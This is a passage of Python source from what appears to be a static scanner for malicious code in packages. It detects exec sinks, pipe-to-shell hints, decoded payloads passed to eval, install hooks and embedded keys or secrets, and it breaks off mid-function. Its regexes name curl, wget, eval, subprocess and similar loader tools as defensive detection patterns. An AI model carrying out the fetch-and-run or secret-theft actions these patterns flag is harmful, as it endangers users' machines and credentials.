_HEX_SINK_CHARS = 400    # ... and within this many characters of the hex run
_DECODED_EXEC_LINE_RE = next(
    p for n, p, _s in OBFUSCATION_PATTERNS if n == "Decoded payload fed to exec/eval"
)


def _python_prose_lines(content: str) -> set[int]:
    """0-based indices of lines that are INSIDE a multi-line string (docstrings, help
    text) in a Python file, plus the opening line when it begins with the quote. Code
    pattern groups skip these; secrets / injection / unicode still scan prose. Uses
    ``tokenize``; falls back to a triple-quote toggle scan on tokenize errors."""
    import io
    import tokenize

    prose: set[int] = set()
    try:
        for tok in tokenize.generate_tokens(io.StringIO(content).readline):
            if tok.type != tokenize.STRING:
                continue
            (srow, scol), (erow, ecol) = tok.start, tok.end
            opens_line = tok.line[:scol].strip() == ""
            if erow == srow:
                # A one-line docstring / bare string statement is prose too.
                if opens_line and tok.line[ecol:].strip() in ("", ")", ","):
                    prose.add(srow - 1)
                continue
            start = srow - 1 if opens_line else srow
            prose.update(range(start, erow))  # closing line keeps its code tail
        return prose
    except (tokenize.TokenError, SyntaxError, IndentationError, ValueError):
        pass
    prose = set()
    in_str: str | None = None
    for i, line in enumerate(content.split("\n")):
        if in_str is not None:
            prose.add(i)
            if in_str in line:
                in_str = None
            continue
        stripped = line.strip()
        for q in ('"""', "'''"):
            first = line.find(q)
            if first == -1:
                continue
            if line.count(q) % 2 == 1:
                in_str = q
                if stripped.startswith(q):
                    prose.add(i)
            break
    return prose


def _js_prose_lines(content: str) -> set[int]:
    return _js_string_state(content)[0]


def _js_string_state(content: str) -> tuple[set[int], set[int]]:
    """``(prose, continuation)`` for a JS/TS file, both 0-based line sets:

    * ``prose`` — lines strictly INSIDE a multi-line template literal or block comment
      (README-style text that bundles embed: install instructions with
      `curl … | bash`, `npx …` hints);
    * ``continuation`` — lines that BEGIN inside a template literal (prose lines plus
      the closing line, whose code tail is still scanned) so a per-line string check
      can start in the right state.

    Nested ``${…}`` expressions are tracked so code inside them is not prose.
    Conservative: on any confusion the walk simply ends and later lines are code."""
    prose: set[int] = set()
    continuation: set[int] = set()
    i, n, line = 0, len(content), 0
    # state stack: "tpl" (inside backtick), "expr" (inside ${…} of a template, brace depth)
    stack: list[list] = []
    in_str: str | None = None
    in_block_comment = False
    escape = False
    while i < n:
        ch = content[i]
        if ch == "\n":
            if in_block_comment or (stack and stack[-1][0] == "tpl"):
                prose.add(line + 1)
                continuation.add(line + 1)
            if in_str in ("'", '"'):
                in_str = None
            line += 1
            i += 1
            escape = False
            continue
        if in_block_comment:
            if content.startswith("*/", i):
                in_block_comment = False
                prose.discard(line)
                i += 2
                continue
            i += 1
            continue
        if in_str is not None:
            if escape:
                escape = False
            elif ch == "\\":
                escape = True
            elif ch == in_str:
                in_str = None
            i += 1
            continue
        if stack and stack[-1][0] == "tpl":
            if escape:
                escape = False
            elif ch == "\\":
                escape = True
            elif ch == "`":
                stack.pop()
                prose.discard(line)  # closing line keeps its code tail
            elif content.startswith("${", i):
                stack.append(["expr", 0])
                prose.discard(line)  # this line carries code inside the template
                i += 2
                continue
            i += 1
            continue
        # code (top level or inside a ${…} expression)
        if content.startswith("//", i):
            i = content.find("\n", i)
            if i == -1:
                break
            continue
        if content.startswith("/*", i):
            in_block_comment = True
            i += 2
            continue
        if ch == "/":
            # A regex literal (`/don't/`) would desync the quote state; skip it when the
            # previous significant char says an operand is expected here.
            j = i - 1
            while j >= 0 and content[j] in " \t":
                j -= 1
            prev = content[j] if j >= 0 else "\n"
            if prev in "(,=:[!&|?{};+-*%<>~^\n" or content[max(0, j - 5): j + 1].endswith(
                    ("return", "typeof")):
                k = i + 1
                in_class = False
                while k < n and content[k] != "\n":
                    c2 = content[k]
                    if c2 == "\\":
                        k += 2
                        continue
                    if in_class:
                        if c2 == "]":
                            in_class = False
                    elif c2 == "[":
                        in_class = True
                    elif c2 == "/":
                        break
                    k += 1
                if k < n and content[k] == "/":
                    i = k + 1
                    continue
        if ch in "'\"":
            in_str = ch
        elif ch == "`":
            stack.append(["tpl", line])
        elif stack and stack[-1][0] == "expr":
            if ch == "{":
                stack[-1][1] += 1
            elif ch == "}":
                if stack[-1][1] == 0:
                    stack.pop()
                else:
                    stack[-1][1] -= 1
        i += 1
    return prose, continuation


def _in_prose_string_at(line: str, pos: int, start_in: str | None = None) -> bool:
    r"""True if ``line[pos]`` sits inside a quoted string literal on that line AND the
    string reads as prose up to that point (>= 3 words precede the match inside it):
    `'Run \`npx foo\` to retry'` in an error message is advice to a human;
    `run("npx foo")` / `URL = 'https://…'` are code. ``start_in`` seeds the state for
    a line that begins inside a template literal opened on an earlier line."""
    in_str: str | None = start_in
    escape = False
    str_start = 0
    for i, ch in enumerate(line[:pos]):
        if in_str is not None:
            if escape:
                escape = False
            elif ch == "\\":
                escape = True
            elif ch == in_str:
                in_str = None
        elif ch in "'\"`":
            in_str = ch
            str_start = i + 1
    if in_str is None:
        return False
    return len(line[str_start:pos].split()) >= 3


def _in_string_literal_at(line: str, pos: int) -> bool:
    """True if ``line[pos]`` sits inside a quoted string literal opened on that line."""
    in_str: str | None = None
    escape = False
    for ch in line[:pos]:
        if in_str is not None:
            if escape:
                escape = False
            elif ch == "\\":
                escape = True
            elif ch == in_str:
                in_str = None
        elif ch in "'\"`":
            in_str = ch
    return in_str is not None


# Shell-script payload files run their text as commands; a `curl … | sh` there is code.
_SHELL_PAYLOAD_EXTS = frozenset({".sh", ".bash", ".zsh", ".ps1", ".bat", ".cmd", ".vbs"})
# Anything in a file that can run a command string or hand it to code that does
# (including indirect lookups), checked before treating a pipe-to-shell STRING in a
# shipped test file as an executed payload.
_FILE_EXEC_SINK_RE = re.compile(
    r"\bsubprocess\b|\bos\.(?:system|popen|exec\w*|spawn\w*)\b|\bPopen\b|\bpty\.spawn\b|"
    r"\bcommands\.getoutput\b|\bshlex\b|\bexec\s*\(|\beval\s*\(|\bcompile\s*\(|"
    r"__import__|\bimportlib\b|\bgetattr\s*\(|\bchild_process\b|\bexec(?:Sync|File\w*)?\s*\(|"
    r"\bspawn(?:Sync)?\s*\(|\bFunction\s*\(|\bvm\.\w+|\brequire\s*\(\s*[^'\"]|\bimport\s*\(|"
    r"\bsh\s*\(|\$\s*`|\bzx\b|\bexeca\b|\bshelljs\b",
)


# npm runs only these package.json scripts on a consumer's machine (`npm install` of the
# package as a dependency); everything else under "scripts" is the maintainer's.
_NPM_CONSUMER_SCRIPTS = frozenset({
    "preinstall", "install", "postinstall", "prepare", "preprepare", "postprepare",
})
_PKG_JSON_SCRIPT_RE = re.compile(r'^\s*"([^"]+)"\s*:\s*"')
_HELP_PRINT_RE = re.compile(
    r"\b(?:console\.(?:log|error|warn|info)|print|echo|usage|USAGE|help|HELP)\b|"
    r"process\.std(?:out|err)\.write|sys\.std(?:out|err)\.write")


# A call that runs its string argument as a process (JS child_process / execa / zx,
# Python subprocess / os). Used to tell a printed `npx` hint from one that is spawned.
_RUN_CALL_RE = re.compile(
    r"(?<![\w$])(?:exec|execSync|execFile|execFileSync|spawn|spawnSync|fork|execa|execaSync"
    r"|execaCommand|execaCommandSync|execCommand|system|popen|Popen|run|call|check_call"
    r"|check_output|getoutput|getstatusoutput|shell|sh)\s*\(|(?<![\w$])\$\s*`")
_BOUND_NAME_RE = re.compile(r"([A-Za-z_$][\w$]*)\s*(?::\s*[\w$<>\[\]|. ]+)?=(?![=>])[^=]*$")


def _npx_string_runs(lines: list[str], idx: int, line: str, pos: int, str_start: int,
                     start_in: str | None) -> bool:
    """Is the string holding this `npx …` spawned rather than printed? It is the
    argument of a run call on this line (`console.log(execSync('npx foo'))`), or it is
    bound to a name that a run call in the file uses (`const USAGE = 'npx foo'` …
    `execSync(USAGE)`). Adversarial recall review of the help-text relaxation (#24)."""
    if _RUN_CALL_RE.search(line[:pos]):
        return True
    name = None
    if start_in is None:
        m = _BOUND_NAME_RE.search(line[:max(0, str_start - 1)])
        name = m.group(1) if m else None
    else:
        # A template literal opened on an earlier line: the binding is where it opened.
        for n in range(idx - 1, max(-1, idx - 60), -1):
            tick = lines[n].find("`")
            if tick == -1:
                continue
            if _RUN_CALL_RE.search(lines[n][:tick + 1]):
                return True
            m = _BOUND_NAME_RE.search(lines[n][:tick])
            name = m.group(1) if m else None
            break
    if not name or name in ("const", "let", "var"):
        return False
    return any(n != idx and _RUN_CALL_RE.search(ln) and _uses_name(ln, name)
               for n, ln in enumerate(lines))


def _maintainer_script_owners(content: str, memo: list, idx: int, line: str,
                              pattern: re.Pattern[str]) -> set[str] | None:
    """The package.json scripts holding EVERY match of ``pattern`` on line ``idx``
    when none of them is reachable from an install lifecycle script; ``None`` when a
    match is outside ``scripts``, in a reachable script, or the file is unparseable."""
    if not memo:
        memo.append(npm_scripts.parse_scripts(content))
    info = memo[0]
    if info is None:
        return None
    return npm_scripts.maintainer_scripts_at(
        info, idx, [(m.start(), m.end()) for m in pattern.finditer(line)])


def _npx_not_a_load(file_path: str, line: str, pos: int, start_in: str | None = None,
                    lines: list[str] | None = None, idx: int = 0) -> bool:
    """An `npx <pkg>` that never runs for a consumer (precision PR 2): a maintainer script
    in package.json (not an install lifecycle hook), or help text a CLI prints, i.e.
    the match sits in a string literal that is indented help (`'  npx foo\\n'`), carries
    a `\\n` escape, or is on a print/usage line, and the string is not itself spawned
    (``_npx_string_runs``)."""
    if Path(file_path).name.lower() == "package.json":
        m = _PKG_JSON_SCRIPT_RE.match(line)
        return bool(m and m.group(1) not in _NPM_CONSUMER_SCRIPTS and m.end() <= pos)
    in_str: str | None = start_in
    escape = False
    str_start = 0
    for i, ch in enumerate(line[:pos]):
        if in_str is not None:
            if escape:
                escape = False
            elif ch == "\\":
                escape = True
            elif ch == in_str:
                in_str = None
        elif ch in "'\"`":
            in_str = ch
            str_start = i + 1
    if in_str is None:
        return False
    if _npx_string_runs(lines if lines is not None else [line],
                        idx if lines is not None else 0, line, pos, str_start, start_in):
        return False
    before = line[str_start:pos]
    if before.startswith("  ") and not before.strip():
        return True
    tail = line[str_start:]
    return "\\n" in tail or bool(_HELP_PRINT_RE.search(line))


# One PEM body line once its quoting is peeled off: optional leading ``+``/``,``/``(``
# (a key assembled from parts), an optional string prefix and quote, the base64 run, an
# optional ``\n`` escape, closing quote and trailing ``,;+)]\``. The WHOLE line must be
# that, so an identifier inside code (``elasticsearchConnectivityCheckPathPlaceholder:
# "…"`` in an i18n table) never counts as key material.
_PEM_BODY_LINE_RE = re.compile(
    r"""^[\s+,(\[]*(?:[bBrRuU]{0,2}["'`])?([A-Za-z0-9+/]{40,}={0,2})"""
    r"""(?:\\[rn])*["'`]?[\s,;+)\]\\]*$""")


def _pem_body_token(token: str) -> bool:
    """A base64 run shaped like a key line: >= 2 digits. A real 64-char key line holds
    ~10 digits (no digit at all is ~2e-5 likely); a camelCase identifier holds none."""
    return sum(ch.isdigit() for ch in token) >= 2


def _pem_body_line(text: str) -> bool:
    m = _PEM_BODY_LINE_RE.match(text)
    return bool(m and _pem_body_token(m.group(1)))


def _pem_tail_has_body(tail: str) -> bool:
    """A body on the marker's own line, after ``\n`` escapes (a one-line JSON / string
    literal key): any escape-separated segment is a whole base64 key line."""
    for seg in re.split(r"\\[rn]|\s+", tail):
        seg = seg.strip("\"'`,;+)]")
        if PEM_BODY_RE.fullmatch(seg) and _pem_body_token(seg):
            return True
    return False


def _pem_has_body(lines: list[str], idx: int, marker_end: int) -> bool:
    """True when a real key body follows the PEM header at ``lines[idx]``: a base64 key
    line on the same line (after a ``\n`` escape), within the next 2 lines, or >= 3 such
    lines anywhere near a marker (a key assembled from parts). A body line is the whole
    line (quotes/commas peeled off) in the base64 charset with digits, so prose and
    identifiers near a bare marker (a UI placeholder string) never count."""
    if _pem_tail_has_body(lines[idx][marker_end:]):
        return True
    for n in range(idx + 1, min(len(lines), idx + 3)):
        if _pem_body_line(lines[n]):
            return True
    lo, hi = max(0, idx - 30), min(len(lines), idx + 60)
    body_lines = sum(1 for n in range(lo, hi) if _pem_body_line(lines[n]))
    return body_lines >= 3


def _generic_secret_plausible(value: str) -> bool:
    """A generic ``token = "…"`` value counts only if it LOOKS like a credential: letters
    AND digits, Shannon entropy >= 3.5 bits/char, no ``/`` (path- or label-shaped
    constants such as ``"auth-request-type/at"``). Provider rules are untouched."""
    import math

    if "/" in value:
        return False
    if not (re.search(r"[A-Za-z]", value) and re.search(r"\d", value)):
        return False
    counts: dict[str, int] = {}
    for ch in value:
        counts[ch] = counts.get(ch, 0) + 1
    n = len(value)
    entropy = -sum((c / n) * math.log2(c / n) for c in counts.values())
    return entropy >= 3.5


_SHARED_KEY_NAME_RE = re.compile(
    r"(?i)(?:default|public|demo|shared|sample|example|dummy|fake|placeholder|community)")


def _assigned_identifier(line: str, key_pos: int) -> str:
    """The whole identifier the generic-key rule matched inside: `defaultApiKey` for a
    match that starts at `ApiKey`, `DEMO_TOKEN` for one that starts at `TOKEN`."""
    head = re.search(r"[\w$]*$", line[:key_pos])
    tail = re.match(r"[\w$]*", line[key_pos:])
    return (head.group(0) if head else "") + (tail.group(0) if tail else "")


_JS_ASSIGN_RE_CACHE: dict[str, re.Pattern] = {}


def _resolve_js_assignment(lines: list[str], idx: int, name: str) -> str | None:
    """The expression last assigned to JS ``name`` in the ~80 lines above ``idx``
    (``const C = 'cu' + 'rl …'``, ``let a = 'x', b = 'y'``), as source text. A compound
    assignment (``C += …``) makes the value unknown: ``None``. Used only to RAISE an
    exec verdict (see ``classify_js_exec``)."""
    from src.scanner.exec_classify import split_top_level_args

    rx = _JS_ASSIGN_RE_CACHE.get(name)
    if rx is None:
        rx = re.compile(r"(?<![\w$.])" + re.escape(name) + r"\s*([-+*/%|&^]?)=(?![=>])")
        _JS_ASSIGN_RE_CACHE[name] = rx
    for n in range(idx - 1, max(-1, idx - 80), -1):
        m = rx.search(lines[n])
        if not m:
            continue
        if m.group(1):
            return None
        rest = lines[n][m.end():].strip()
        # `const script =` with the value on the following line(s), or a `+` chain that
        # continues: read on until the statement ends (rollup's dist/native.js).
        k = n + 1
        while k < min(len(lines), n + 8) and k < idx and (
                not rest or rest.endswith(("+", "=", "(", ",")) and not rest.endswith(";")):
            nxt = lines[k].strip()
            if not nxt or nxt.startswith("//"):
                k += 1
                continue
            rest = f"{rest} {nxt}".strip()
            k += 1
            if rest.endswith(";"):
                break
        args = split_top_level_args(rest)
        rhs = (args[0] if args else "").rstrip().rstrip(";").strip()
        return rhs or None
    return None


def _text_decode_flows(lines: list[str], idx: int, call_src: str) -> bool:
    """Does percent-decoding / ``unescape`` / a reversed string / evaluated code build
    this exec call, inline or through a name assigned from one (80 lines above)?"""
    from src.scanner.exec_classify import TEXT_DECODE_RE

    if TEXT_DECODE_RE.search(call_src):
        return True
    tainted = _tainted_names(lines, idx - 80, idx + 1,
                             lambda _n, ln: bool(TEXT_DECODE_RE.search(ln)))
    return any(_uses_name(call_src, t) for t in tainted)


def _resolve_py_assignment(lines: list[str], idx: int, name: str):
    """Find ``name = <expr>`` in the preceding ~80 lines and return the parsed RHS
    (``ast`` node) — so ``cmd = ["git", "log"]`` …  ``Popen(cmd)`` reads as fixed argv."""
    from src.scanner.exec_classify import _parse_expr, extract_call

    rx = _PY_ASSIGN_RE_CACHE.get(name)
    if rx is None:
        rx = re.compile(r"^\s*" + re.escape(name) + r"\s*(?::[^=\n]+)?=(?!=)\s*(.*)$")
        _PY_ASSIGN_RE_CACHE[name] = rx
    loop_rx = _PY_ASSIGN_RE_CACHE.get("for " + name)
    if loop_rx is None:
        # `for cmd in ["npx.cmd", "npx.exe", "npx"]:` binds `cmd` to each element; the
        # list node is returned and read as "one of these constants".
        loop_rx = re.compile(r"^\s*(?:async\s+)?for\s+" + re.escape(name)
                             + r"\s+in\s+([\[(].*[\])])\s*:\s*(?:#.*)?$")
        _PY_ASSIGN_RE_CACHE["for " + name] = loop_rx
    for n in range(idx - 1, max(-1, idx - 80), -1):
        lm = loop_rx.match(lines[n])
        if lm:
            return _parse_expr(lm.group(1))
        m = rx.match(lines[n])
        if not m:
            continue
        rhs = m.group(1).strip()
        if rhs[:1] in "[(":
            col = len(lines[n]) - len(m.group(1))
            got = extract_call(lines, n, col, lang="python", max_lines=30)
            if got:
                return _parse_expr(got[0])
            return None
        return _parse_expr(rhs.split("#", 1)[0])
    return None


def _why(label: str, category: str, kind: str) -> str:
    """Remediation text for a classified finding: a capability carries only its
    one-line description; a defect carries the reason plus the category hint."""
    if not label:
        return ""
    label = label[0].upper() + label[1:]
    if kind == "capability":
        return label
    hint = _REMEDIATION_HINTS.get(category, "Review and address this finding")
    return f"{label} — {hint}"


# Co-occurrence composites measure "nearby" in LINES — meaningless in a bundled
# file with 19 KB lines, where everything is within one line of everything. Cap the
# character distance too (≈ the same 40 lines of ordinary code).
_COOCCUR_MAX_CHARS = 4000


def _cooccur(
    lines: list[str], prose: set[int], re_a: re.Pattern, re_b: re.Pattern,
    max_lines: int, exclude_b: re.Pattern | None = None,
) -> int | None:
    """Earliest 0-based line where an ``re_a`` hit and an ``re_b`` hit sit within
    ``max_lines`` lines AND ``_COOCCUR_MAX_CHARS`` characters of each other (prose
    lines excluded); None when they don't."""
    offsets: list[int] = []
    pos = 0
    for ln in lines:
        offsets.append(pos)
        pos += len(ln) + 1
    a_hits = [(i, offsets[i] + m.start()) for i, ln in enumerate(lines)
              if i not in prose for m in [re_a.search(ln)] if m]
    if not a_hits:
        return None
    b_hits = [(i, offsets[i] + m.start()) for i, ln in enumerate(lines)
              if i not in prose and not (exclude_b and exclude_b.search(ln))
              for m in [re_b.search(ln)] if m]
    best: int | None = None
    for ai, ap in a_hits:
        for bi, bp in b_hits:
            if abs(ai - bi) <= max_lines and abs(ap - bp) <= _COOCCUR_MAX_CHARS:
                cand = min(ai, bi)
                best = cand if best is None else min(best, cand)
    return best


def _cooccur_flow(
    lines: list[str], prose: set[int], is_src, re_b: re.Pattern, max_lines: int,
    exclude_b: re.Pattern | None = None,
) -> int | None:
    """Like :func:`_cooccur`, but the ``re_b`` sink must USE the source: the source
    expression inline on the sink's line after the sink, or a name tainted from a
    source line (assigned from it, directly or through other names). Earliest 0-based
    line of a qualifying pair within ``max_lines`` / ``_COOCCUR_MAX_CHARS``."""
    offsets: list[int] = []
    pos = 0
    for ln in lines:
        offsets.append(pos)
        pos += len(ln) + 1
    src_lines = [i for i, ln in enumerate(lines) if i not in prose and is_src(ln)]
    if not src_lines:
        return None
    src_set = set(src_lines)
    tainted = _tainted_names(lines, 0, len(lines), lambda n, _ln: n in src_set)
    best: int | None = None
    for bi, ln in enumerate(lines):
        if bi in prose or (exclude_b and exclude_b.search(ln)):
            continue
        m = re_b.search(ln)
        if not m:
            continue
        sink_tail = ln[m.start():] + "\n" + (lines[bi + 1] if bi + 1 < len(lines) else "")
        uses = is_src(ln[m.start():]) or any(_uses_name(sink_tail, t) for t in tainted)
        if not uses:
            continue
        bp = offsets[bi] + m.start()
        for ai in src_lines:
            if abs(ai - bi) <= max_lines and abs(offsets[ai] - bp) <= _COOCCUR_MAX_CHARS:
                cand = min(ai, bi)
                best = cand if best is None else min(best, cand)
    return best


_LOADER_CTX_RE = re.compile(
    r"fetch\s*\(|urlopen|urlretrieve|requests\.|httpx\.|axios|https?\.get|\bcurl\b|\bwget\b|"
    r"pip\s+install|npm\s+install|\bimport\b|\brequire\s*\(|download|\bexec\s*\(|"
    r"\beval\s*\(|\bsource\b|<script|\bopen\s*\(",
    re.IGNORECASE,
)
_LOADER_CTX_CHARS = 300


def _has_loader_context(lines: list[str], idx: int, pos: int) -> bool:
    """A load/fetch/exec token within ~300 characters of ``lines[idx][pos]`` (spanning
    up to 2 neighbouring lines) — bounded by characters so a bundled 10 KB line can't
    supply the context from unrelated code."""
    window = lines[idx][max(0, pos - _LOADER_CTX_CHARS): pos + _LOADER_CTX_CHARS]
    before = "\n".join(lines[max(0, idx - 2): idx])[-_LOADER_CTX_CHARS:]
    after = "\n".join(lines[idx + 1: idx + 3])[:_LOADER_CTX_CHARS]
    return bool(_LOADER_CTX_RE.search(before + "\n" + window + "\n" + after))
_UNTRUSTED_DEF_RE = re.compile(
    # a DEFINITION named fetch/webhook (`async fetch(path) {`, `def fetch(self`) is
    # not an ingestion point
    r"(?:\basync\s+|\bfunction\s+|\bdef\s+|^\s*)(?:fetch|webhook)\s*\([^)]*\)\s*(?:\{|:|->)",
)


def _untrusted_lines(lines: list[str], candidates=None) -> list[int]:
    """``candidates``: the line indices UNTRUSTED_INPUT_RE can match on (from
    ``LineFilter.lines``); None tries every line."""
    # A comment that mentions a webhook / fetch is not an ingestion point (next.js
    # run-tests.js: "parsed by the commenter webhook", precision PR 2).
    idxs = range(len(lines)) if candidates is None else sorted(candidates)
    return [i for i in idxs
            if UNTRUSTED_INPUT_RE.search(lines[i]) and not _UNTRUSTED_DEF_RE.search(lines[i])
            and not lines[i].lstrip().startswith(("#", "//", "*", "/*"))]


def _near(idxs: list[int], idx: int, window: int) -> bool:
    return any(abs(i - idx) <= window for i in idxs)


# --- Flow, not proximity (precision PR 2) ------------------------------------------
# A tiny line-level taint pass: a name is tainted when it is assigned (or bound by
# `with … as x` / an arrow-callback parameter) on a line that reads a source, or from an
# expression that uses an already-tainted name. Regex-level, language-agnostic
# (Python / JS / TS); it errs toward "flows" only through explicit assignments.
_TAINT_ASSIGN_RE = re.compile(
    r"^\s*(?:export\s+)?(?:(?:const|let|var)\s+)?"
    r"(?P<lhs>[A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*)*(?:\s*,\s*[A-Za-z_$][\w$]*)*"
    r"|\{[^}]*\}|\[[^\]]*\]|\([^)]*\))"
    r"\s*(?::\s*[^=]+?)?=(?![=>])\s*(?P<rhs>.*)$",
)
_TAINT_AS_RE = re.compile(r"\bas\s+([A-Za-z_]\w*)\s*:")
_TAINT_ARROW_RE = re.compile(
    r"(?:\(\s*([^()]*?)\s*\)|\b([A-Za-z_$][\w$]*))\s*=>|"
    r"\bfunction\s*[\w$]*\s*\(\s*([^()]*?)\s*\)",
)
_TAINT_SKIP_NAMES = frozenset({
    "const", "let", "var", "await", "async", "function", "return", "new", "this", "self",
    "true", "false", "null", "None", "undefined",
})


def _names_in(text: str) -> set[str]:
    return {n for n in re.findall(r"[A-Za-z_$][\w$]*", text) if n not in _TAINT_SKIP_NAMES}


def _uses_name(text: str, name: str) -> bool:
    if name not in text:  # the regex below needs the name verbatim
        return False
    return bool(re.search(r"(?<![\w$.])" + re.escape(name) + r"(?![\w$])", text))


def _tainted_names(lines: list[str], start: int, end: int, is_source) -> set[str]:
    """Names tainted by a source between ``lines[start:end]`` (in order, two passes so
    a module-level parse below a function still counts for whole-file windows)."""
    tainted: set[str] = set()
    for _pass in range(2):
        before = len(tainted)
        for n in range(max(0, start), min(end, len(lines))):
            ln = lines[n]
            src_here = is_source(n, ln)
            m = _TAINT_ASSIGN_RE.match(ln)
            if m:
                rhs = m.group("rhs")
                if src_here or any(_uses_name(rhs, t) for t in tainted):
                    lhs = m.group("lhs")
                    tainted |= {lhs} if "." in lhs and "," not in lhs else _names_in(lhs)
            if src_here:
                am = _TAINT_AS_RE.search(ln)
                if am:
                    tainted.add(am.group(1))
                for pm in _TAINT_ARROW_RE.finditer(ln):
                    tainted |= _names_in(next(g for g in pm.groups() if g is not None)
                                         if any(pm.groups()) else "")
        if len(tainted) == before:
            break
    return tainted


def _untrusted_flows(lines: list[str], idx: int, call_src: str, untrusted: list[int]) -> bool:
    """Does an untrusted value (request body / query / fetched content) REACH the call?
    Direct inline use in the call, or a name assigned from such a value within the
    ``_UNTRUSTED_WINDOW`` lines above. An unrelated ``fetch(`` nearby is not a flow."""
    if UNTRUSTED_INPUT_RE.search(call_src):
        return True
    src = set(untrusted)
    tainted = _tainted_names(lines, idx - _UNTRUSTED_WINDOW, idx + 1,
                             lambda n, _ln: n in src)
    return any(_uses_name(call_src, t) for t in tainted)


# `'.'.join(ids[::-1])` reverses a LIST of names (IPython's completer); it is not the
# reversed-string decode that `[::-1]` in DECODE_SINK_RE is for.
_JOIN_REVERSED_LIST_RE = re.compile(r"""['"][^'"]+['"]\s*\.\s*join\s*\([^)]*\[::-1\]""")


def _is_decode_line(line: str) -> bool:
    from src.scanner.exec_classify import ASSEMBLY_DECODE_RE

    if ASSEMBLY_DECODE_RE.search(line):
        return True  # chr()/bytes([...])/fromCharCode assembly hides text like a decode
    return bool(DECODE_SINK_RE.search(line)) and not (
        _JOIN_REVERSED_LIST_RE.search(line)
        and not DECODE_SINK_RE.search(_JOIN_REVERSED_LIST_RE.sub(" ", line)))


def _decoded_flows(lines: list[str], idx: int, call_src: str) -> bool:
    """Does a DECODED value (base64 / hex / zlib / reversed string) build this call?
    Inline in the call, or through a name assigned from a decode within 80 lines above.
    A decoded payload handed to a shell keeps the shell finding high (precision PR 2)."""
    if _is_decode_line(call_src):
        return True
    tainted = _tainted_names(lines, idx - 80, idx + 1,
                             lambda _n, ln: _is_decode_line(ln))
    return any(_uses_name(call_src, t) for t in tainted)


_EVAL_METHOD_CALL_RE = re.compile(r"\.(?:eval|exec|runsource|runcode|run_code)\s*\(")
_PY_CALL_RE = re.compile(r"(?<![\w.])(?:self\.|cls\.)?([A-Za-z_]\w*)\s*\(")


def _untrusted_to_eval_method(lines: list[str], untrusted: list[int],
                              prose: set[int]) -> int | None:
    """0-based line of the first ``.eval(`` / ``.exec(`` / ``.runsource(`` method call
    whose argument carries untrusted input: inline, through a name assigned from it, or
    through the parameter of a function in this file that such a name is passed to (one
    hop). ``None`` when there is no such flow."""
    from src.scanner.exec_classify import extract_call, split_top_level_args

    src = set(untrusted)
    tainted = _tainted_names(lines, 0, len(lines), lambda n, _ln: n in src)
    if not tainted and not any(_EVAL_METHOD_CALL_RE.search(lines[i]) for i in untrusted):
        return None
    # One hop: `self.execute_command(request, cmd, frame)` taints the matching parameter
    # of `def execute_command(self, request, command, frame)`.
    defs: dict[str, list[str]] = {}
    for i, ln in enumerate(lines):
        m = re.match(r"\s*(?:async\s+)?def\s+([A-Za-z_]\w*)\s*\(", ln)
        if m:
            sig = " ".join(lines[i: i + 8])
            got = extract_call([sig], 0, 0, lang="python", max_lines=1)
            inner = got[0][got[0].find("(") + 1: -1] if got else ""
            params = [re.split(r"[:=]", p)[0].strip().lstrip("*")
                      for p in split_top_level_args(inner)]
            defs[m.group(1)] = [p for p in params if p and p not in ("self", "cls", "/", "")]
    hop: set[str] = set()
    for i, ln in enumerate(lines):
        if i in prose or not tainted:
            continue
        for m in _PY_CALL_RE.finditer(ln):
            params = defs.get(m.group(1))
            if not params:
                continue
            got = extract_call(lines, i, m.start(1), lang="python", max_lines=6)
            if not got:
                continue
            call = got[0]
            args = split_top_level_args(call[call.find("(") + 1: -1])
            for k, a in enumerate(args):
                if "=" in a.split("(")[0] or k >= len(params):
                    continue
                if any(_uses_name(a, t) for t in tainted):
                    hop.add(params[k])
    reach = tainted | hop
    for i, ln in enumerate(lines):
        if i in prose:
            continue
        m = _EVAL_METHOD_CALL_RE.search(ln)
        if not m:
            continue
        got = extract_call(lines, i, m.start() + 1, lang="python", max_lines=6)
        arg = got[0] if got else ln[m.start():]
        if UNTRUSTED_INPUT_RE.search(arg) or any(_uses_name(arg, t) for t in reach):
            return i
    return None


# JS: the program's OWN command line / environment.
_JS_CLI_SOURCE_RE = re.compile(
    r"process\.argv|process\.env|\bminimist\s*\(|\byargs\b|\.opts\s*\(\s*\)|"
    r"\bparseArgs\s*\(|\bmeow\s*\(|\bcac\s*\(|\bprogram\.args\b",
)
_JS_CLI_FILE_RE = re.compile(
    r"process\.argv|process\.env|['\"](?:minimist|yargs(?:/[\w/]+)?|commander|meow|cac|"
    r"node:util)['\"]",
)
_JS_ACTION_RE = re.compile(r"\.action\s*\(\s*(?:async\s+)?(?:function\s*[\w$]*\s*)?"
                           r"\(?\s*([^()=]*?)\s*\)?\s*(?:=>|\{)")
# Pure helpers / globals that may wrap a CLI value without making it something else.
_JS_CLI_NEUTRAL = frozenset({
    "path", "JSON", "String", "Number", "Math", "Object", "Array", "encodeURIComponent",
    "quote", "shellQuote", "shellEscape", "escape", "join", "dirname", "resolve",
    "basename", "relative", "normalize", "slice", "trim", "toString", "process", "argv",
    "env", "cwd",
})


def _js_cli_expr_checker(content: str, lines: list[str]):
    """``is_cli_expr(expr)`` for a JS file that reads its own CLI / environment, else
    ``None``. An expression counts when it reads ``process.argv`` / ``process.env`` /
    a minimist / yargs / commander result directly, or every identifier it roots in is
    a name bound to one (whole file: options are parsed once, used far below)."""
    if not _JS_CLI_FILE_RE.search(content):
        return None
    names = _tainted_names(lines, 0, len(lines),
                           lambda _n, ln: bool(_JS_CLI_SOURCE_RE.search(ln)))
    for m in _JS_ACTION_RE.finditer(content):  # commander `.action((dir, opts) => …)`
        names |= _names_in(m.group(1))

    def is_cli_expr(expr: str) -> bool:
        if _JS_CLI_SOURCE_RE.search(expr) and not UNTRUSTED_INPUT_RE.search(expr):
            return True
        stripped = re.sub(r"(['\"`])(?:\\.|(?!\1).)*\1", " ", expr)
        roots = set(re.findall(r"(?<![\w$.])([A-Za-z_$][\w$]*)", stripped))
        roots -= _TAINT_SKIP_NAMES
        if not roots:
            return False
        return all(r in names or r in _JS_CLI_NEUTRAL for r in roots) and \
            any(r in names for r in roots)
    return is_cli_expr


_CLI_IMPORT_RE = re.compile(r"^\s*(?:import|from)\s+(?:typer|click|argparse)\b", re.MULTILINE)
_CLI_DECORATOR_RE = re.compile(
    r"^\s*@(?:(?:click|typer)\.|[\w.]+\.(?:command|callback|group)\s*(?:\(|$))",
)
_CLI_ARGS_RE = re.compile(r"\bsys\.argv\b|\.parse_(?:known_)?args\s*\(")


def _cli_origin(lines: list[str], idx: int, has_cli_import: bool) -> bool:
